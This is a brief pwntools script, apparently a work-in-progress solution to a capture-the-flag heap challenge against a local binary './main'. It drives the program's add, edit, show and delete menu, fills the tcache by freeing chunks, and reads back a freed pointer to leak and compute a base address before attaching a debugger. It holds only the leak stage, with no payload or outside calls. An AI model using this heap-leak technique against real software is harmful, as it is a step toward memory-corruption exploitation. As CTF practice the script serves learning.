from pwn import *
r=process('./main')
#context.log_level='debug'
def add(idx,size,con):
	r.recv()
	r.sendline(str(1))
	r.recv()
	r.sendline(str(idx))
	r.recv()
	r.sendline(str(size))
	r.recv()
	r.send(str(con))

def edit(idx,size,con):
	r.recv()
	r.sendline(str(3))
	r.recv()
	r.sendline(str(idx))
	r.recv()
	r.sendline(str(size))
	r.recv()
	r.send(str(con))
def show(idx):
	r.recv()
	r.sendline(str(4))
	r.recv()
	r.sendline(str(idx))

def dele(idx):
	r.recv()
	r.sendline(str(2))
	r.recv()
	r.sendline(str(idx))
for i in range(9):
	add(i,1024,'a')
for i in range(8):
	dele(i)
add(0,0x10,' ')
show(0)
print(len("0 :  "))
#r.interactive()
r.recv(5)
leak=u64(r.recv(5).ljust(8,'\x00'))*0x100+0x90
base=leak-0x7ffba21a0000
print(hex(base))
print(hex(leak))
gdb.attach(r)
r.interactive()